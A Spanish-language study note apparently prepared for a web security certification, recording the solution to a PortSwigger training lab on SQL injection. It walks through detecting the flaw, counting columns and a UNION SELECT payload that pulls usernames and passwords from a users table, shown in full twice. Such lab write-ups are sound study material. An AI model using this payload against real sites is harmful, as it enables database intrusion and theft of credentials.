---
tipo: lab
vuln: sqli
nivel: practitioner
tags: [bscp, tipo/lab, vuln/sqli, nivel/practitioner, estado/resuelto]
fase: [1-acceso]
url: https://portswigger.net/web-security/sql-injection/lab-retrieving-data-from-other-tables
estado: resuelto
---

# SQL Injection · Lab 04 — Retrieving data from other tables (practitioner) ✅

## Objetivo
Extraer datos de otras tablas de la base de datos (usuarios y contraseñas) mediante un ataque UNION.

## Fase(s)
- 1-acceso

## Pasos realizados
1. Detecté la vulnerabilidad con una comilla simple (`'`) en el parámetro `category`.
2. Utilicé `ORDER BY` para confirmar que la consulta original tiene **2 columnas** (error al usar `ORDER BY 3`).
3. Probé `UNION SELECT` con dos `NULL` y confirmé que la primera columna se muestra en la UI.
4. Ejecuté el payload que devuelve la contraseña y el nombre de usuario de la tabla `users`:
   ```
   GET /filter?category=Corporate+gifts+' UNION SELECT password,username FROM users-- HTTP/2
   ```
   La respuesta muestra las filas de la tabla `users` con sus credenciales.

## Payload usado (solución real)
```
GET /filter?category=Corporate+gifts+' UNION SELECT password,username FROM users-- HTTP/2
```

## Qué generalizo
- **Recuperar datos de otras tablas:** usar `UNION SELECT <col1>,<col2> FROM <tabla>` para extraer valores cuando la consulta vulnerable devuelve varias columnas. El orden de las columnas debe coincidir con la posición de la columna visible en la UI.
- **Detección de columna visible:** insertar un marcador (`'a'`) en cada posición y observar cuál aparece.

## Enlace academy
- https://portswigger.net/web-security/sql-injection/lab-retrieving-data-from-other-tables